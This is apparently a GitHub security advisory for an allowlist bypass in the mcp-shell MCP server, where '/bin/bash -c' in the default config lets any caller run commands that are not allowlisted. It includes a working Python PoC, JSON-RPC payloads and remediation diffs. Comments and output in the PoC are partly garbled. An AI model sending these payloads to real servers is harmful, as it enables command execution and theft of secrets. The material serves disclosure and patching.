# [H] mcp-shell has a Secure Mode Allowlist Bypass via Default `/bin/bash` Executable

## Summary
Severity: High
Advisory: GHSA-3x77-wg38-92r3
CVE: CVE-2026-55581
CWE: CWE-78, CWE-183, CWE-1188
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-3x77-wg38-92r3
Type: github-advisory

## Affected
- Go: `github.com/sonirico/mcp-shell` — affected >=0 <0.6.0

## Details
### Summary

`mcp-shell` ships a default Docker configuration (`security.yaml`) that includes `/bin/bash` in the `allowed_executables` allowlist. The command validator (`security.go`) only checks whether the first token of the supplied command matches an allowed executable; it does not inspect or reject shell command-mode flags such as `-c`. As a result, any MCP tool caller can send `command=/bin/bash -c <arbitrary-command>` to the `shell_exec` tool and execute commands that are not in the allowlist — including `id`, `env`, `curl`, `wget`, and any other binary present in the container. The bypass works with the default Docker image, requires no authentication, and requires no modifications to server configuration. Successful exploitation gives the attacker arbitrary OS command execution inside the container as `mcpuser`.

### Details

`mcp-shell` implements a *secure mode* in which command execution is restricted to an explicit allowlist of executables defined in `security.yaml`. The Docker image ships this file with the following entry:

```yaml
# security.yaml (line 29)
allowed_executables:
  - "ls"
  - ...
  - "/bin/bash"  # Only allow if you trust the arguments
```

The comment itself acknowledges the risk, but the shipped default does not enforce any argument-level restriction. The validation logic in `security.go` is responsible for enforcing secure mode:

```go
// security.go:84-96
for _, allowed := range v.config.AllowedExecutables {
    if v.matchesExecutable(executable, allowed) {
        if err := v.checkBlockedPatternsAndCommands(command); err != nil {
            return err
        }
        return nil
    }
}
```

`executable` is derived solely from `parts[0]` after splitting the input on whitespace (`security.go:67`). When the command is `/bin/bash -c id`, `executable` evaluates to `/bin/bash`, which matches the allowlist entry. The `-c` flag and subsequent arguments are passed to `checkBlockedPatternsAndCommands`, which only checks for shell metacharacters (`|`, `&`, `;`, `<`, `>`, `(`, `)`, `{`, `}`, `[`, `]`, `` ` ``, `$`, `\`, `"`, `'`) and a configurable list of `blocked_commands`/`blocked_patterns` — both of which default to empty arrays in the shipped configuration. The flag `-c` does not match any blocked metacharacter, so the check passes.

The validated command then reaches the executor:

```go
// executor.go:149-163
executable, args, err := e.parseCommand(command)
// ...
cmd = exec.CommandContext(ctx, executable, args...)
```

`parseCommand` splits the command string, yielding `executable="/bin/bash"` and `args=["-c", "id"]`. `exec.CommandContext` is invoked directly — no shell is spawned by the executor itself — but `/bin/bash -c id` is equivalent to a shell invocation, executing `id` outside the allowlist.

**Data flow (source → sink):**

| Step | Location | Description |
|------|----------|-------------|
| 1 | `Dockerfile:55` | `COPY security.yaml /etc/mcp-shell/security.yaml` — bundles vulnerable config into image |
| 2 | `Dockerfile:57` | `ENV MCP_SHELL_SEC_CONFIG_FILE=/etc/mcp-shell/security.yaml` — activates config by default |
| 3 | `security.yaml:29` | `/bin/bash` registered in `allowed_executables` |
| 4 | `main.go:84-102` | MCP tool `shell_exec` registered with required `command` parameter |
| 5 | `handler.go:34` | `command := request.RequireString("command")` — attacker-controlled input received |
| 6 | `handler.go:49` | `h.validator.validateCommand(command)` — validation called |
| 7 | `security.go:67-96` | `executable = parts[0]` matches `/bin/bash`; `-c` not blocked; returns `nil` |
| 8 | `handler.go:59` | Validated command forwarded to executor |
| 9 | `executor.go:163` | `exec.CommandContext(ctx, "/bin/bash", "-c", "id")` — sink: arbitrary execution |

### PoC

**Prerequisites:**

- Docker installed and accessible.
- Repository source code checked out (build context is the repository root).
- `python3` available (for the automated PoC script).

**Step 1 — Build the Docker image**

```bash
docker build \
  -f vuln-001/Dockerfile \
  /path/to/mcp-shell-repo \
  -t mcp-shell-vuln-001:latest
```

**Step 2 — Run the PoC script**

```bash
python3 vuln-001/poc.py mcp-shell-vuln-001:latest
```

The script sends three MCP JSON-RPC requests over stdio:

1. `initialize` handshake
2. `tools/call shell_exec` with `command="/bin/bash -c id"` — **exploit payload**
3. `tools/call shell_exec` with `command="id"` — **control**: direct invocation must be blocked

**Expected output (exploit success):**

```
[id=2] /bin/bash -c id response:
  → status='success', exit_code=0, stdout='uid=1000(mcpuser) gid=1000(mcpuser) groups=1000(mcpuser),1000(mcpuser)'

[+] PASS: uid= confirmed → /bin/bash -c via arbitrary command execution  successful!

[+] control confirmed: 'id' direct execution blocked (allowlist behavior normal)
    → allowlist bypass  /bin/bash -c only through the path occurs proven
```

**Alternatively, using raw `printf` (no Python required):**

```bash
printf '%s\n' \
  '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"poc","version":"0.0.1"}}}' \
  '{"jsonrpc":"2.0","method":"notifications/initialized","params":{}}' \
  '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"shell_exec","arguments":{"command":"/bin/bash -c id","base64":false}}}' \
| docker run --rm -i mcp-shell-vuln-001:latest
```

**Observed MCP response:**

```json
{
  "command": "/bin/bash -c id",
  "execution_time": "3.854555ms",
  "exit_code": 0,
  "security_info": {"security_enabled": true, "working_dir": "/tmp", "timeout_applied": true},
  "status": "success",
  "stderr": "",
  "stdout": "uid=1000(mcpuser) gid=1000(mcpuser) groups=1000(mcpuser),1000(mcpuser)"
}
```

**Remediation (patch guidance):**

1. Remove shell interpreters from the default `security.yaml` allowlist:

```diff
--- a/security.yaml
+++ b/security.yaml
-    - "/bin/bash"  # Only allow if you trust the arguments
```

2. Add argument-level validation in `security.go` to block shell command-mode flags even when a shell interpreter is allowlisted:

```diff
--- a/security.go
+++ b/security.go
  executable := parts[0]
+ args := parts[1:]
+
+ if isShellCommandMode(executable, args) {
+     return fmt.Errorf("shell command mode is not allowed in secure mode: %s", executable)
+ }

  // Check if the executable is in the allowlist
  for _, allowed := range v.config.AllowedExecutables {
  ...
  }
+
+ func isShellCommandMode(executable string, args []string) bool {
+     base := filepath.Base(executable)
+     switch base {
+     case "sh", "bash", "dash", "ash", "zsh", "ksh":
+         for _, arg := range args {
+             if arg == "-c" || (strings.HasPrefix(arg, "-") && strings.Contains(arg, "c")) {
+                 return true
+             }
+         }
+     }
+     return false
+ }
```

### Impact

This is an **OS Command Injection** vulnerability (CWE-78). The `shell_exec` MCP tool is designed to execute only pre-approved executables; the bypass allows an attacker to run arbitrary commands present in the container image (`curl`, `wget`, `env`, `sed`, `grep`, `tar`, etc. — all installed by the Dockerfile) under the identity of `mcpuser` (UID 1000).

**Who is impacted:**

- **Any operator** deploying the official Docker image without modifying the default `security.yaml` is vulnerable immediately upon deployment. No custom configuration, no elevated privileges, and no prior authentication are required.
- **MCP clients** that interact with a vulnerable `mcp-shell` instance — including automated AI agents, LLM orchestration platforms, and CI/CD pipelines — may be leveraged to exfiltrate secrets, tamper with files accessible to `mcpuser`, or pivot further within the container's network.
- The `--network=none` flag used in the PoC demonstrates successful exploitation even with no network access; in production deployments with network access, the impact extends to data exfiltration and lateral movement.

**Concrete consequences of exploitation:**

- **Confidentiality:** Dump environment variables (`/bin/bash -c env`), read files, or exfiltrate credentials visible to `mcpuser`.
- **Integrity:** Write or modify files within the container's writable filesystem.
- **Availability:** Consume container resources or terminate processes.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# VULN-001 PoC Dockerfile: Secure Mode Allowlist Bypass via /bin/bash -c
# build context: ../repo directory
# usage: docker build -f vuln-001/Dockerfile ../repo -t mcp-shell-vuln-001:latest

# Build stage
FROM golang:1.25-alpine AS builder

RUN apk add --no-cache git

WORKDIR /app

COPY go.mod go.sum ./
RUN go mod download

COPY *.go ./

ARG VERSION=vuln-001-poc
RUN CGO_ENABLED=0 GOOS=linux go build \
    -ldflags "-X main.version=${VERSION} -s -w" \
    -a -installsuffix cgo \
    -o mcp-shell .

# Runtime stage
FROM alpine:3.22

RUN apk add --no-cache \
    bash \
    curl \
    wget \
    git \
    make \
    findutils \
    grep \
    sed \
    gawk \
    tar \
    gzip \
    unzip \
    ca-certificates \
    && rm -rf /var/cache/apk/*

RUN addgroup -g 1000 mcpuser && \
    adduser -D -s /bin/bash -u 1000 -G mcpuser mcpuser

RUN mkdir -p /tmp/mcp-workspace && \
    chown mcpuser:mcpuser /tmp/mcp-workspace

RUN mkdir -p /etc/mcp-shell && \
    chown mcpuser:mcpuser /etc/mcp-shell

COPY --from=builder /app/mcp-shell /usr/local/bin/mcp-shell
RUN chmod +x /usr/local/bin/mcp-shell

# Vulnerable default configuration: /bin/bash text allowed_executables text containsdone
COPY security.yaml /etc/mcp-shell/security.yaml

ENV MCP_SHELL_SEC_CONFIG_FILE=/etc/mcp-shell/security.yaml
ENV PATH="/usr/local/bin:${PATH}"

USER mcpuser
WORKDIR /tmp/mcp-workspace

ENTRYPOINT ["mcp-shell"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
VULN-001 PoC: Secure Mode Allowlist Bypass via /bin/bash -c

Vulnerability summary:
  security.yamltext allowed_executablestext /bin/bash text registerbecomes text,
  validateExecutableCommand (security.go:60-105)text parts[0]=/bin/bash only allowlist checkand
  -c flagtext blocktext text. text /bin/bash -c id text verificationtext passedtext
  executor.go:163 from exec.CommandContext(ctx, "/bin/bash", "-c", "id") text executebecomes
  allowlisttext without arbitrary commandtext(id, env etc.)text executedonetext.

usage:
  python3 poc.py [IMAGE_NAME]
  default text: mcp-shell-vuln-001:latest
"""

import subprocess
import json
import sys

IMAGE = sys.argv[1] if len(sys.argv) > 1 else "mcp-shell-vuln-001:latest"


def make_msg(obj):
    return json.dumps(obj, separators=(',', ':'))


# MCP JSON-RPC message whentext
MESSAGES = [
    # 1. initialize handshake
    make_msg({
        "jsonrpc": "2.0", "id": 1,
        "method": "initialize",
        "params": {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "vuln-001-poc", "version": "0.0.1"}
        }
    }),
    # 2. initialized text (response none)
    make_msg({"jsonrpc": "2.0", "method": "notifications/initialized", "params": {}}),
    # 3. vulnerability text: /bin/bash -c id
    #    id text allowlisttext textonly /bin/bash text because it exists verification passed → id execute
    make_msg({
        "jsonrpc": "2.0", "id": 2,
        "method": "tools/call",
        "params": {
            "name": "shell_exec",
            "arguments": {"command": "/bin/bash -c id", "base64": False}
        }
    }),
    # 4. comparison: id directly execute → allowlisttext because it is missing blockbecomestext done
    make_msg({
        "jsonrpc": "2.0", "id": 3,
        "method": "tools/call",
        "params": {
            "name": "shell_exec",
            "arguments": {"command": "id", "base64": False}
        }
    }),
    # 5. add evidence: env environment variable text (envtext allowlisttext none)
    make_msg({
        "jsonrpc": "2.0", "id": 4,
        "method": "tools/call",
        "params": {
            "name": "shell_exec",
            "arguments": {"command": "/bin/bash -c env", "base64": False}
        }
    }),
]


def extract_text(resp):
    """MCP tools/call responsefrom text contents extract"""
    try:
        content = resp.get("result", {}).get("content", [])
        for item in content:
            if item.get("type") == "text":
                return item["text"]
    except Exception:
        pass
    return None


def run_poc():
    stdin_data = "\n".join(MESSAGES) + "\n"

    print(f"[*] text: {IMAGE}")
    print("[*] text: /bin/bash -c id")
    print("[*] texttimes principle: validateExecutableCommandtext parts[0]=/bin/bash only allowlist check, -c textblock")
    print()

    try:
        proc = subprocess.run(
            ["docker", "run", "--rm", "-i", "--network=none", IMAGE],
            input=stdin_data.encode(),
            capture_output=True,
            timeout=30,
        )
    except subprocess.TimeoutExpired:
        print("[-] error: container response timeout (30seconds)")
        return False, "timeout"
    except FileNotFoundError:
        print("[-] error: docker commandtext text can none")
        return False, "docker not found"
    except Exception as e:
        print(f"[-] error: {e}")
        return False, str(e)

    stdout = proc.stdout.decode(errors="replace")
    stderr = proc.stderr.decode(errors="replace")

    print("=== STDOUT (JSON-RPC response) ===")
    print(stdout)
    if stderr:
        print("=== STDERR (server log, partial) ===")
        print(stderr[:1500])
    print()

    # response parse
    responses = {}
    for line in stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            resp = json.loads(line)
            msg_id = resp.get("id")
            if msg_id is not None:
                responses[msg_id] = resp
        except json.JSONDecodeError:
            pass

    exploit_passed = False
    exploit_evidence = ""

    # [id=2] /bin/bash -c id result check (key point evidence)
    if 2 in responses:
        text = extract_text(responses[2])
        if text:
            print(f"[id=2] /bin/bash -c id response text: {text[:400]}")
            try:
                result = json.loads(text)
                stdout_val = result.get("stdout", "")
                status = result.get("status", "")
                exit_code = result.get("exit_code", -1)
                print(f"  → status={status!r}, exit_code={exit_code}, stdout={stdout_val!r}")
                if "uid=" in stdout_val and status == "success":
                    exploit_passed = True
                    exploit_evidence = (
                        f"command=/bin/bash -c id | status={status} | "
                        f"exit_code={exit_code} | stdout={stdout_val}"
                    )
                    print(f"\n[+] PASS: uid= check → /bin/bash -c text arbitrary command execute success!")
                    print(f"[+] Deterministic evidence: {exploit_evidence}")
            except json.JSONDecodeError:
                if "uid=" in text:
                    exploit_passed = True
                    exploit_evidence = text
                    print(f"[+] PASS: uid= confirmed (raw): {text[:200]}")
    else:
        print("[-] id=2 response none (secondstext failure or server error)")

    # [id=3] id directly execute → block check (text)
    if 3 in responses:
        text = extract_text(responses[3]) or ""
        resp_str = str(responses[3])
        blocked = (
            "not in allowed list" in text
            or "not in allowed list" in resp_str
            or "Security violation" in text
            or "isError" in resp_str and "true" in resp_str.lower()
        )
        if blocked:
            print(f"\n[+] text check: 'id' directly executetext blocked (allowlist behavior normal)")
            print(f"    → allowlist texttimestext /bin/bash -c pathfromonly occurdonetext proofdone")
        else:
            print(f"[*] 'id' directly result: {text[:200]}")

    # [id=4] /bin/bash -c env add evidence
    if 4 in responses:
        text = extract_text(responses[4]) or ""
        try:
            result = json.loads(text)
            stdout_val = result.get("stdout", "")
            if "PATH=" in stdout_val or "HOME=" in stdout_val:
                env_lines = stdout_val.splitlines()[:5]
                print(f"\n[+] add evidence: /bin/bash -c env success (envtext allowlist textcontains)")
                print(f"    first 5lines: {chr(10).join('    ' + l for l in env_lines)}")
        except Exception:
            pass

    return exploit_passed, exploit_evidence


if __name__ == "__main__":
    passed, evidence = run_poc()
    print()
    if passed:
        print("[+] vulnerability reproduction result: PASS")
        sys.exit(0)
    else:
        print("[-] vulnerability reproduction result: FAIL")
        sys.exit(1)
```

## References
- https://github.com/sonirico/mcp-shell/security/advisories/GHSA-3x77-wg38-92r3
- https://github.com/sonirico/mcp-shell/pull/16
- https://github.com/sonirico/mcp-shell/commit/f31377fce6ec31114e5a4398c0e5270552bce09f
- https://github.com/sonirico/mcp-shell
- https://github.com/sonirico/mcp-shell/releases/tag/v0.6.0
